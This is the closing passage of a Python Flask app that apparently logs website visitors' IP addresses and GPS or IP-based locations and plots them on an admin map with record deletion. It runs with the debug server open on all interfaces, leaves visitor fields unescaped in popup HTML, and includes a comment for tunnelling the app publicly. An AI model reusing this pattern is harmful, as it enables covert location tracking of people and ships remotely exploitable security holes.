            attribution:'©OpenStreetMap ©CARTO',maxZoom:19
        }).addTo(map);
        const markers=[];
        {% for v in visitors %}
        {% if v['latitude'] and v['latitude'] != 0 %}
        (function(){
            const m=L.circleMarker([{{ v['latitude'] }},{{ v['longitude'] }}],{
                radius:{% if v['location_source']=='gps' %}7{% else %}5{% endif %},
                fillColor:'{% if v["location_source"]=="gps" %}#22c55e{% else %}#fbbf24{% endif %}',
                color:'{% if v["location_source"]=="gps" %}#16a34a{% else %}#d97706{% endif %}',
                weight:2,opacity:.8,fillOpacity:.6
            }).addTo(map);
            m.bindPopup('<b>{{ v["ip_address"] }}</b><br>{{ v["city"] }}, {{ v["country"] }}<br><small>{{ v["location_source"]|upper }} · {{ v["timestamp"] }}</small>');
            markers.push(m);
        })();
        {% endif %}
        {% endfor %}
        if(markers.length>0){
            const g=L.featureGroup(markers);
            map.fitBounds(g.getBounds().pad(.2));
        }

        function delRow(btn, id){
            if(!confirm('Delete this record?')) return;
            const row = btn.closest('tr');
            row.classList.add('deleting');
            fetch('/delete/'+id, {method:'DELETE'})
                .then(r=>r.json())
                .then(d=>{
                    if(d.status==='ok'){
                        setTimeout(()=>row.remove(), 300);
                        // update total count
                        const tot=document.querySelector('.stat:nth-child(1) .num');
                        if(tot) tot.textContent=Math.max(0,parseInt(tot.textContent)-1);
                    } else {
                        row.classList.remove('deleting');
                        alert('Error: '+d.message);
                    }
                })
                .catch(()=>{row.classList.remove('deleting');alert('Request failed')});
        }
    </script>
</body>
</html>'''


# ─── Entry Point ──────────────────────────────────────────────────────────────

if __name__ == '__main__':
    init_db()
    cert = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'cert.pem')
    key = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'key.pem')

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        lan_ip = s.getsockname()[0]
        s.close()
    except Exception:
        lan_ip = '127.0.0.1'

    if os.path.exists(cert) and os.path.exists(key):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(cert, key)
        print(f"\n  HTTPS server ready — GPS will work!")
        print(f"  Local:  https://127.0.0.1:5000")
        print(f"  Phone:  https://{lan_ip}:5000")
        print(f"  Accept the browser security warning to proceed.\n")
        app.run(host='0.0.0.0', port=5000, debug=True, ssl_context=ctx)
    else:
        print("  WARNING: No cert.pem/key.pem — running HTTP (GPS may not work)")
        app.run(host='0.0.0.0', port=5000, debug=True)






    # cloudflared tunnel --url https://localhost:5000 --no-tls-verify